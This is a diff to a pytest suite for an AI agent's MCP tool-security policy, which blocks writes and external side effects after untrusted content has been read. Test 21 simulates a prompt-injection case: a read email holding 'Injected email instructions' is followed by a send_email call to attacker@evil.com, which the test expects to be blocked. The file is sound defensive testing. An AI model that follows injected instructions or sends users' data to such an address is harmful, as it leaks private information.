@@ -67,7 +67,13 @@ def declared(monkeypatch):
     monkeypatch.setenv(
         LOCAL_MCP_WRITE_TOOLS_ENV, f"{WRITE_TOOL},{WRITE_TOOL_TWO}"
     )
+    from src.tool_utils import set_mcp_manager
+    manager, session = mock_mcp_manager()
+    set_mcp_manager(manager)
+    monkeypatch.setattr(execution, "get_mcp_manager", lambda: manager)
+    monkeypatch.setattr(execution, "_owner_is_admin", lambda owner: True)
     yield
+    set_mcp_manager(None)
 
 
 def grant(*tools, resources=None, owner="alice", session_id="s"):
@@ -84,7 +90,8 @@ def grant(*tools, resources=None, owner="alice", session_id="s"):
 def mock_mcp_manager(
     server="a1b2c3d4",
     tools=("search_notes", "read_note", "create_note", "update_note"),
-    url="https://example.test/mcp?token=SECRET",
+    transport="stdio",
+    url=None,
 ):
     manager = McpManager()
     session = SimpleNamespace(
@@ -96,10 +103,31 @@ def mock_mcp_manager(
     )
     manager._sessions[server] = session
     manager._tools[server] = [{"name": tool} for tool in tools]
-    manager._resource_endpoints[server] = (
-        endpoint_identity(url),
-        configuration_incarnation(url),
-    )
+    if transport == "stdio":
+        manager._resource_endpoints[server] = (
+            f"stdio:{server}",
+            configuration_incarnation(("stdio", None, server, [], {})),
+        )
+        manager._connections[server] = {
+            "status": "connected",
+            "name": server,
+            "transport": "stdio",
+            "tool_count": len(tools),
+            "identity": "",
+        }
+    else:
+        url = url or "https://example.test/mcp?token=SECRET"
+        manager._resource_endpoints[server] = (
+            endpoint_identity(url),
+            configuration_incarnation((transport, url, None, None, None)),
+        )
+        manager._connections[server] = {
+            "status": "connected",
+            "name": server,
+            "transport": transport,
+            "tool_count": len(tools),
+            "identity": "",
+        }
     manager._register_resource_connection(server, session)
     return manager, session
 
@@ -181,9 +209,8 @@ async def test_ordinary_local_read_followed_by_authorized_local_write(
     assert context.external_untrusted_context_seen is True
     assert context.decision_for(WRITE_TOOL).allowed is True
 
-    manager, session = mock_mcp_manager()
-    monkeypatch.setattr(execution, "get_mcp_manager", lambda: manager)
-    monkeypatch.setattr(execution, "_owner_is_admin", lambda owner: True)
+    manager = execution.get_mcp_manager()
+    session = manager._sessions["a1b2c3d4"]
 
     auth = grant(READ_TOOL, WRITE_TOOL)
     _, read_res = await execution.execute_tool_block(
@@ -364,9 +391,8 @@ async def test_mcp_server_replacement_between_admission_and_execution(
 async def test_mcp_configuration_changes_invalidate_stale_authority(
     declared, monkeypatch
 ):
-    manager, session = mock_mcp_manager()
-    monkeypatch.setattr(execution, "get_mcp_manager", lambda: manager)
-    monkeypatch.setattr(execution, "_owner_is_admin", lambda owner: True)
+    manager = execution.get_mcp_manager()
+    session = manager._sessions["a1b2c3d4"]
 
     auth = grant(READ_TOOL, WRITE_TOOL)
 
@@ -391,9 +417,8 @@ async def test_mcp_configuration_changes_invalidate_stale_authority(
 # 15. Missing or insufficient request authority.
 @pytest.mark.asyncio
 async def test_missing_or_insufficient_request_authority(declared, monkeypatch):
-    manager, session = mock_mcp_manager()
-    monkeypatch.setattr(execution, "get_mcp_manager", lambda: manager)
-    monkeypatch.setattr(execution, "_owner_is_admin", lambda owner: True)
+    manager = execution.get_mcp_manager()
+    session = manager._sessions["a1b2c3d4"]
 
     # Authority grants only READ_TOOL, not WRITE_TOOL
     auth = grant(READ_TOOL)
@@ -468,9 +493,8 @@ def test_concurrent_requests_do_not_leak_continuation_authority(declared):
 async def test_approval_denial_does_not_dispatch_the_tool(
     declared, monkeypatch
 ):
-    manager, session = mock_mcp_manager()
-    monkeypatch.setattr(execution, "get_mcp_manager", lambda: manager)
-    monkeypatch.setattr(execution, "_owner_is_admin", lambda owner: True)
+    manager = execution.get_mcp_manager()
+    session = manager._sessions["a1b2c3d4"]
 
     auth = grant(WRITE_TOOL)
     store = ToolApprovalStore()
@@ -547,3 +571,322 @@ def test_existing_builtin_tool_capabilities_remain_unchanged():
     email_caps = capabilities_for_tool("send_email")
     assert email_caps.effects == frozenset({ToolEffect.EXTERNAL_SIDE_EFFECT})
     assert email_caps.result_integrity is ResultIntegrity.EXTERNAL_UNTRUSTED
+
+
+# 21. Built-in email read followed by email send with both names incorrectly declared local.
+@pytest.mark.asyncio
+async def test_builtin_email_declared_local_bypass_rejected(monkeypatch):
+    from src.tool_utils import set_mcp_manager
+    manager, session = mock_mcp_manager(
+        server="email",
+        tools=("read_email", "send_email"),
+    )
+    set_mcp_manager(manager)
+    monkeypatch.setattr(execution, "get_mcp_manager", lambda: manager)
+    monkeypatch.setattr(execution, "_owner_is_admin", lambda owner: True)
+
+    monkeypatch.setenv(LOCAL_MCP_READ_TOOLS_ENV, "mcp__email__read_email")
+    monkeypatch.setenv(LOCAL_MCP_WRITE_TOOLS_ENV, "mcp__email__send_email")
+
+    email_send_caps = capabilities_for_tool("mcp__email__send_email")
+    assert email_send_caps.effects == frozenset({ToolEffect.EXTERNAL_SIDE_EFFECT})
+    assert email_send_caps.result_integrity is ResultIntegrity.EXTERNAL_UNTRUSTED
+
+    context = ToolRunSecurityContext()
+    context.observe_tool_result(
+        "mcp__email__read_email",
+        {"stdout": "Injected email instructions", "exit_code": 0},
+    )
+    assert context.external_untrusted_context_seen is True
+
+    decision = context.decision_for("mcp__email__send_email")
+    assert decision.allowed is False
+    assert "external_side_effect" in (decision.reason or "")
+
+    auth = grant("send_email")
+    desc, res = await execution.execute_tool_block(
+        ToolBlock("mcp__email__send_email", '{"to":"attacker@evil.com","subject":"x","body":"y"}'),
+        owner=auth.owner,
+        session_id=auth.session_id,
+        request_authority=auth,
+        security_context=context,
+    )
+    assert res.get("blocked") is True
+    assert res.get("policy") == "external_untrusted_context"
+
+
+# 22. Built-in tools retaining their original capability classifications under declarations.
+def test_builtin_tools_retain_original_capabilities_under_declarations(monkeypatch):
+    monkeypatch.setenv(
+        LOCAL_MCP_READ_TOOLS_ENV,
+        "mcp__email__read_email,mcp__builtin_browser__browser_navigate,mcp__memory__search_memories,bash",
+    )
+    monkeypatch.setenv(
+        LOCAL_MCP_WRITE_TOOLS_ENV,
+        "mcp__email__send_email,mcp__builtin_browser__browser_click,mcp__image_gen__generate_image,write_file",
+    )
+
+    # Email
+    assert capabilities_for_tool("mcp__email__send_email").effects == frozenset({ToolEffect.EXTERNAL_SIDE_EFFECT})
+    assert capabilities_for_tool("mcp__email__read_email").effects == frozenset({ToolEffect.READ_PRIVATE})
+
+    # Browser
+    assert capabilities_for_tool("mcp__builtin_browser__browser_navigate").known is False
+    assert capabilities_for_tool("mcp__builtin_browser__browser_click").known is False
+
+    # Memory and Image Generation
+    assert capabilities_for_tool("mcp__memory__search_memories").known is False
+    assert capabilities_for_tool("mcp__image_gen__generate_image").known is False
+
+    # Native tools
+    assert capabilities_for_tool("bash").effects == frozenset({ToolEffect.EXECUTE_CODE})
+    assert capabilities_for_tool("write_file").effects == frozenset({ToolEffect.WRITE_WORKSPACE})
+
+
+# 23. HTTP MCP read followed by a declared same-server write fails closed.
+@pytest.mark.asyncio
+async def test_http_mcp_read_followed_by_declared_write_rejected(declared, monkeypatch):
+    from src.tool_utils import set_mcp_manager
+    manager, session = mock_mcp_manager(transport="http", url="https://remote.test/mcp")
+    set_mcp_manager(manager)
+    monkeypatch.setattr(execution, "get_mcp_manager", lambda: manager)
+
+    context = ToolRunSecurityContext()
+    context.observe_tool_result(READ_TOOL, RESULT)
+    assert context.external_untrusted_context_seen is True
+
+    decision = context.decision_for(WRITE_TOOL)
+    assert decision.allowed is False
+    assert "write_private" in (decision.reason or "")
+
+    auth = grant(READ_TOOL, WRITE_TOOL)
+    desc, res = await execution.execute_tool_block(
+        ToolBlock(WRITE_TOOL, '{"title":"t","body":"b"}'),
+        owner=auth.owner,
+        session_id=auth.session_id,
+        request_authority=auth,
+        security_context=context,
+    )
+    assert res.get("blocked") is True
+    session.call_tool.assert_not_awaited()
+
+
+# 24. SSE MCP read followed by a declared same-server write fails closed.
+@pytest.mark.asyncio
+async def test_sse_mcp_read_followed_by_declared_write_rejected(declared, monkeypatch):
+    from src.tool_utils import set_mcp_manager
+    manager, session = mock_mcp_manager(transport="sse", url="https://remote.test/sse")
+    set_mcp_manager(manager)
+    monkeypatch.setattr(execution, "get_mcp_manager", lambda: manager)
+
+    context = ToolRunSecurityContext()
+    context.observe_tool_result(READ_TOOL, RESULT)
+    assert context.external_untrusted_context_seen is True
+
+    decision = context.decision_for(WRITE_TOOL)
+    assert decision.allowed is False
+    assert "write_private" in (decision.reason or "")
+
+    auth = grant(READ_TOOL, WRITE_TOOL)
+    desc, res = await execution.execute_tool_block(
+        ToolBlock(WRITE_TOOL, '{"title":"t","body":"b"}'),
+        owner=auth.owner,
+        session_id=auth.session_id,
+        request_authority=auth,
+        security_context=context,
+    )
+    assert res.get("blocked") is True
+    session.call_tool.assert_not_awaited()
+
+
+# 25. Unknown transport fails closed.
+@pytest.mark.asyncio
+async def test_unknown_transport_fails_closed(declared, monkeypatch):
+    from src.tool_utils import set_mcp_manager
+    manager, session = mock_mcp_manager(transport="custom_pipe")
+    set_mcp_manager(manager)
+    monkeypatch.setattr(execution, "get_mcp_manager", lambda: manager)
+
+    context = ToolRunSecurityContext()
+    context.observe_tool_result(READ_TOOL, RESULT)
+    assert context.external_untrusted_context_seen is True
+
+    decision = context.decision_for(WRITE_TOOL)
+    assert decision.allowed is False
+
+    auth = grant(READ_TOOL, WRITE_TOOL)
+    desc, res = await execution.execute_tool_block(
+        ToolBlock(WRITE_TOOL, '{"title":"t","body":"b"}'),
+        owner=auth.owner,
+        session_id=auth.session_id,
+        request_authority=auth,
+        security_context=context,
+    )
+    assert res.get("blocked") is True
+    session.call_tool.assert_not_awaited()
+
+
+# 26. Tool discovery removal fails closed.
+@pytest.mark.asyncio
+async def test_tool_discovery_removal_fails_closed(declared, monkeypatch):
+    manager = execution.get_mcp_manager()
+    session = manager._sessions["a1b2c3d4"]
+
+    context = ToolRunSecurityContext()
+    context.observe_tool_result(READ_TOOL, RESULT)
+    assert context.decision_for(WRITE_TOOL).allowed is True
+
+    # Drop WRITE_TOOL from discovered tools
+    manager._tools["a1b2c3d4"] = [{"name": "search_notes"}, {"name": "read_note"}]
+
+    assert context.decision_for(WRITE_TOOL).allowed is False
+
+    auth = grant(READ_TOOL, WRITE_TOOL)
+    desc, res = await execution.execute_tool_block(
+        ToolBlock(WRITE_TOOL, '{"title":"t","body":"b"}'),
+        owner=auth.owner,
+        session_id=auth.session_id,
+        request_authority=auth,
+        security_context=context,
+    )
+    assert res.get("exit_code") == 1
+    session.call_tool.assert_not_awaited()
+
+
+# 27. Destructive candidate MCP tool fails closed.
+def test_destructive_candidate_mcp_tool_fails_closed(declared):
+    manager = execution.get_mcp_manager()
+    manager._tools["a1b2c3d4"] = [
+        {"name": "search_notes"},
+        {"name": "create_note", "annotations": {"destructiveHint": True}},
+    ]
+
+    context = ToolRunSecurityContext()
+    context.observe_tool_result(READ_TOOL, RESULT)
+    assert context.decision_for(WRITE_TOOL).allowed is False
+
+
+# 28. User-authored or untrusted control plane sources fail closed.
+@pytest.mark.parametrize(
+    "untrusted_source",
+    [
+        "active email reader",
+        "current chat uploaded files",
+        "active editor document",
+        "saved memory: minimal context",
+        "email writing style",
+        "recent tool context",
+    ],
+)
+def test_untrusted_control_plane_sources_fail_closed(declared, untrusted_source):
+    context = ToolRunSecurityContext(
+        external_untrusted_context_seen=True,
+        external_sources=[untrusted_source, READ_TOOL],
+    )
+    assert context.decision_for(WRITE_TOOL).allowed is False
+
+
+# 29. Server-owned control plane sources allow continuation.
+@pytest.mark.parametrize(
+    "server_owned_source",
+    [
+        "skills",
+        "client runtime context",
+        "backend runtime context",
+        "integrations",
+        "mcp tools",
+        "agents.md",
+    ],
+)
+def test_server_owned_control_plane_sources_allow_continuation(declared, server_owned_source):
+    context = ToolRunSecurityContext(
+        external_untrusted_context_seen=True,
+        external_sources=[server_owned_source, READ_TOOL],
+    )
+    assert context.decision_for(WRITE_TOOL).allowed is True
+
+
+# 30. Deterministic runtime validation against a disposable stdio MCP server subprocess.
+@pytest.mark.asyncio
+async def test_disposable_stdio_mcp_runtime_validation(monkeypatch):
+    import sys
+    from src.tool_utils import set_mcp_manager
+
+    server_id = "disp_runtime_srv"
+    read_name = f"mcp__{server_id}__read_note"
+    write_name = f"mcp__{server_id}__create_note"
+
+    monkeypatch.setenv(LOCAL_MCP_READ_TOOLS_ENV, read_name)
+    monkeypatch.setenv(LOCAL_MCP_WRITE_TOOLS_ENV, write_name)
+
+    server_script = (
+        "import asyncio\n"
+        "from mcp.server import Server\n"
+        "from mcp.server.stdio import stdio_server\n"
+        "from mcp.types import Tool, TextContent\n"
+        "app = Server('disposable-notes')\n"
+        "@app.list_tools()\n"
+        "async def list_tools():\n"
+        "    return [\n"
+        "        Tool(name='read_note', description='Read a note', inputSchema={'type':'object','properties':{'id':{'type':'string'}}}),\n"
+        "        Tool(name='create_note', description='Create a note', inputSchema={'type':'object','properties':{'text':{'type':'string'}}}),\n"
+        "    ]\n"
+        "@app.call_tool()\n"
+        "async def call_tool(name: str, arguments: dict):\n"
+        "    if name == 'read_note':\n"
+        "        return [TextContent(type='text', text='runtime-note-content')]\n"
+        "    elif name == 'create_note':\n"
+        "        return [TextContent(type='text', text='note-created:' + str(arguments.get('text', '')))]\n"
+        "    raise ValueError(f'Unknown tool: {name}')\n"
+        "async def main():\n"
+        "    async with stdio_server() as (r, w):\n"
+        "        await app.run(r, w, app.create_initialization_options())\n"
+        "if __name__ == '__main__':\n"
+        "    asyncio.run(main())\n"
+    )
+
+    manager = McpManager()
+    ok = await manager.connect_server(
+        server_id,
+        "Disposable Server",
+        "stdio",
+        command=sys.executable,
+        args=["-c", server_script],
+    )
+    assert ok is True
+    set_mcp_manager(manager)
+    monkeypatch.setattr(execution, "get_mcp_manager", lambda: manager)
+    monkeypatch.setattr(execution, "_owner_is_admin", lambda owner: True)
+
+    try:
+        auth = grant(read_name, write_name)
+        context = ToolRunSecurityContext()
+
+        # Execute real read on stdio MCP subprocess
+        _, read_res = await execution.execute_tool_block(
+            ToolBlock(read_name, '{"id":"first"}'),
+            owner=auth.owner,
+            session_id=auth.session_id,
+            request_authority=auth,
+            security_context=context,
+        )
+        assert read_res.get("exit_code") == 0
+        assert "runtime-note-content" in read_res.get("stdout", "")
+        assert context.external_untrusted_context_seen is True
+
+        # Continuation check on real stdio connection
+        assert context.decision_for(write_name).allowed is True
+
+        # Execute real write on stdio MCP subprocess
+        _, write_res = await execution.execute_tool_block(
+            ToolBlock(write_name, '{"text":"persisted"}'),
+            owner=auth.owner,
+            session_id=auth.session_id,
+            request_authority=auth,
+            security_context=context,
+        )
+        assert write_res.get("exit_code") == 0
+        assert "note-created:persisted" in write_res.get("stdout", "")
+    finally:
+        await manager.disconnect_server(server_id)
+        set_mcp_manager(None)
